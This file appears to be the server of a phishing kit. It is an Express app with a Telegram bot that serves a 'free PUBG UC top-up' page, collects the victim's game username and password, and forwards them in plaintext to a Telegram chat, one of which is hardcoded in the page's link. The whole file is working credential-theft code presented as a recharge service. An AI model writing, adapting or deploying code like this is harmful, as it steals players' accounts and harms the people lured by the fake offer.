const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// استخدام middleware لتحليل JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تهيئة بوت التليجرام
const token = process.env.s;
const bot = new TelegramBot(token, { polling: true });

// تخزين الطلبات
let requests = [];

// مسار زيادة الشدات - الأهم!
app.get('/increase/pubg_uc/:chatId', (req, res) => {
  const chatId = req.params.chatId;
  console.log(`طلب صفحة الشحن للبوت: ${chatId}`);
  
  const filePath = path.join(__dirname, 'increase_pubg_uc.html');
  res.sendFile(filePath);
});

// مسار معالجة طلبات الشحن
app.post('/submitIncrease', async (req, res) => {
  try {
    const { chatId, username, password, uc } = req.body;
    
    // حفظ الطلب
    const request = {
      id: Date.now(),
      chatId,
      username,
      password,
      uc,
      timestamp: new Date().toLocaleString('ar-SA'),
      status: 'pending'
    };
    
    requests.push(request);
    
    // إرسال رسالة إلى البوت
    const message = `
    📦 طلب شحن شدات جديد:
    
    👤 اسم المستخدم: ${username}
    🔐 كلمة المرور: ${password}
    🎮 عدد الشدات: ${uc}
    ⏰ الوقت: ${request.timestamp}
    `;
    
    await bot.sendMessage(chatId, message);
    
    res.json({ success: true, message: 'تم استلام طلبك بنجاح' });
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({ success: false, message: 'حدث خطأ أثناء معالجة الطلب' });
  }
});

// خدمة الملفات الثابتة
app.use(express.static('public'));

// صفحة رئيسية
app.get('/', (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html dir="rtl" lang="ar">
  <head>
      <title>خادم متعدد المواقع</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
          body {
              font-family: Arial, sans-serif;
              background-color: #0d1b2a;
              color: #fff;
              padding: 20px;
              text-align: center;
          }
          h1 {
              color: #FFD700;
          }
          a {
              color: #FFD700;
              text-decoration: none;
              font-size: 18px;
              display: block;
              margin: 15px;
              padding: 10px;
              background: #1e293b;
              border-radius: 8px;
          }
          a:hover {
              background: #334155;
          }
      </style>
  </head>
  <body>
      <h1>الخادم يعمل بنجاح! ✅</h1>
      <p>يمكنك زيارة صفحة الشحن من خلال الرابط:</p>
      <a href="/increase/pubg_uc/6808883615">شحن شدات ببجي</a>
  </body>
  </html>
  `);
});

// تشغيل المخدم
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
  console.log(`🌐 Main: http://localhost:${PORT}`);
  console.log(`🎮 PUBG UC: http://localhost:${PORT}/increase/pubg_uc/6808883615`);
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (text === '/start') {
    const welcomeMessage = `
    🎮 مرحباً بك في بوت شحن شدات ببجي!
    
    لإضافة شدات إلى حسابك، يرجى استخدام الرابط التالي:
    ${process.env.R}/increase/pubg_uc/${chatId}
    
    ⚠️ ملاحظة: احتفظ بهذا الرابط خاصاً ولا تشاركه مع الآخرين.
    `;
    
    bot.sendMessage(chatId, welcomeMessage);
  }
});
